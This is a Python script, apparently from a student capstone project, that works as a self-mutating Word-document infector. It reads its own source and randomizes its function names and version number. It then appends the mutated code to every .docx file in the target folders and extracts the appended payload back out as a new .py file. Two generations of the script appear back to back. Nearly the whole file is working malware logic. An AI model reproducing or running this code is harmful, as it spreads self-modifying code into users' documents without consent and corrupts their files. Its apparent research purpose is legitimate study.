from copy import error
import os
import subprocess
from random import randint
import docx

target_directories = ['D:\\Drive\\APranav\\Capstone\\Phase2\\Samples\\Sampletedt\\Test', 'D:\\Drive\\APranav\\Capstone\\Phase2\\Samples\\Sampletedt\\Test1']  # Update with your desired directories

# 2

def ass909001010929887(word_file):
    String = "ass"

    #Appending process
    def find_and_append_to_word_files(executable_contents, word_file):
        
        binary = executable_contents.encode()
        with open(word_file, 'ab') as word_doc:
            word_doc.write(binary)

        print("Appended to Word file in the target directory.")

    #Replacing header    
    def replace_header(document, new_header):
        section = document.sections[0]  # Get the first section of the document
        header = section.header  # Access the header of the section

        # Clear existing header content
        for paragraph in header.paragraphs:
            for run in paragraph.runs:
                run.text = ""

        # Add the new header content
        header.paragraphs[0].text = new_header

    #Extraction process
    def extract_mz_from_word_doc(word_doc_path, output_file):
        with open(word_doc_path, 'rb') as doc_file:
            doc_data = doc_file.read()

        #Find the end of the Word document
        eof_offset = doc_data.find(b'\x2c\x00\x00\x00\x00')
        #print(eof_offset)

        #Extract the MZ executable part
        mz_data = doc_data[eof_offset + 5:]

        #Write the extracted MZ data to a new executable file
        with open(output_file, 'wb') as py_file:
            py_file.write(mz_data)
    
    file = open(__file__,'r')
    Original = file.read()
    Lines = Original.split("\n")
    for _ in range(len(Lines)):
        Split = Lines[_].split(" ")
        #print(Split)
        if (Split[0] == "def"):
            num = randint(1,9)
            for a in range(num):
                String = String + str(randint(1,99999))
            FName = String
            Split[1] = String + "(word_file):"
        else:
            if (Split[0] == "#"):
                Split[1] = str(int(Split[1]) + 1)
                Version = Split[1]
            else:
                try:
                    if (Split[5] == "##"):
                        Split[4] = FName + "(word_file)"
                except:
                    pass
        Lines[_] = " ".join(Split)
    New = "\n".join(Lines)
    try:
        #file2 = open(FName + ".py",'w')
        #file2.write(New)
        # Usage
        executable_contents = New
        #print(executable_contents)

        find_and_append_to_word_files(executable_contents, word_file)

        #Usage
        word_doc_path = 'D:\\Drive\\APranav\\Capstone\\Phase2\\Samples\\Sampletedt\\Test1\\document1.docx'
        base_name = "output.py"
        output_file = base_name

        counter = 1
        while os.path.exists(output_file):
            counter += 1
            output_file = f"{base_name.split('.py')[0]}{counter}.py"

        extract_mz_from_word_doc(word_doc_path, output_file)
    except error as e:
        file2 = open("1inamillion.py",'w')
        file2.write(New)
        print(e)
        file.close()
        file2.close()

    #Open the .docx file
    doc = docx.Document('D:\\Drive\\APranav\\Capstone\\Phase2\\Samples\\Sampletedt\\Test1\\document1.docx')

    #Specify the new header text
    new_header_text = "This is a new header."

    #Replace the document header
    replace_header(doc, new_header_text)

    #Save the modified document
    doc.save('D:\\Drive\\APranav\\Capstone\\Phase2\\Samples\\Sampletedt\\Test1\\modified_file.docx')

word_files = []

for directory in target_directories:
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith('.docx'):
                word_files.append(os.path.join(root, file))

for word_file in word_files:
    ass909001010929887(word_file) ##



from copy import error
import os
import subprocess
from random import randint
import docx

target_directories = ['D:\\Drive\\APranav\\Capstone\\Phase2\\Samples\\Sampletedt\\Test', 'D:\\Drive\\APranav\\Capstone\\Phase2\\Samples\\Sampletedt\\Test1']  # Update with your desired directories

# 2

def a4204716302(word_file):
    String = "a"

    #Appending process
    def find_and_append_to_word_files(executable_contents, word_file):
        
        binary = executable_contents.encode()
        with open(word_file, 'ab') as word_doc:
            word_doc.write(binary)

        print("Appended to Word file in the target directory.")

    #Replacing header    
    def replace_header(document, new_header):
        section = document.sections[0]  # Get the first section of the document
        header = section.header  # Access the header of the section

        # Clear existing header content
        for paragraph in header.paragraphs:
            for run in paragraph.runs:
                run.text = ""

        # Add the new header content
        header.paragraphs[0].text = new_header

    #Extraction process
    def extract_mz_from_word_doc(word_doc_path, output_file):
        with open(word_doc_path, 'rb') as doc_file:
            doc_data = doc_file.read()

        #Find the end of the Word document
        eof_offset = doc_data.find(b'\x2c\x00\x00\x00\x00')
        #print(eof_offset)

        #Extract the MZ executable part
        mz_data = doc_data[eof_offset + 5:]

        #Write the extracted MZ data to a new executable file
        with open(output_file, 'wb') as py_file:
            py_file.write(mz_data)
    
    file = open(__file__,'r')
    Original = file.read()
    Lines = Original.split("\n")
    for _ in range(len(Lines)):
        Split = Lines[_].split(" ")
        #print(Split)
        if (Split[0] == "def"):
            num = randint(1,9)
            for a in range(num):
                String = String + str(randint(1,99999))
            FName = String
            Split[1] = String + "(word_file):"
        else:
            if (Split[0] == "#"):
                Split[1] = str(int(Split[1]) + 1)
                Version = Split[1]
            else:
                try:
                    if (Split[5] == "##"):
                        Split[4] = FName + "(word_file)"
                except:
                    pass
        Lines[_] = " ".join(Split)
    New = "\n".join(Lines)
    try:
        #file2 = open(FName + ".py",'w')
        #file2.write(New)
        # Usage
        executable_contents = New
        #print(executable_contents)

        find_and_append_to_word_files(executable_contents, word_file)

        #Usage
        word_doc_path = 'D:\\Drive\\APranav\\Capstone\\Phase2\\Samples\\Sampletedt\\Test1\\document1.docx'
        base_name = "output.py"
        output_file = base_name

        counter = 1
        while os.path.exists(output_file):
            counter += 1
            output_file = f"{base_name.split('.py')[0]}{counter}.py"

        extract_mz_from_word_doc(word_doc_path, output_file)
    except error as e:
        file2 = open("1inamillion.py",'w')
        file2.write(New)
        print(e)
        file.close()
        file2.close()

    #Open the .docx file
    doc = docx.Document('D:\\Drive\\APranav\\Capstone\\Phase2\\Samples\\Sampletedt\\Test1\\document1.docx')

    #Specify the new header text
    new_header_text = "This is a new header."

    #Replace the document header
    replace_header(doc, new_header_text)

    #Save the modified document
    doc.save('D:\\Drive\\APranav\\Capstone\\Phase2\\Samples\\Sampletedt\\Test1\\modified_file.docx')

word_files = []

for directory in target_directories:
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith('.docx'):
                word_files.append(os.path.join(root, file))

for word_file in word_files:
    a4204716302(word_file) ##



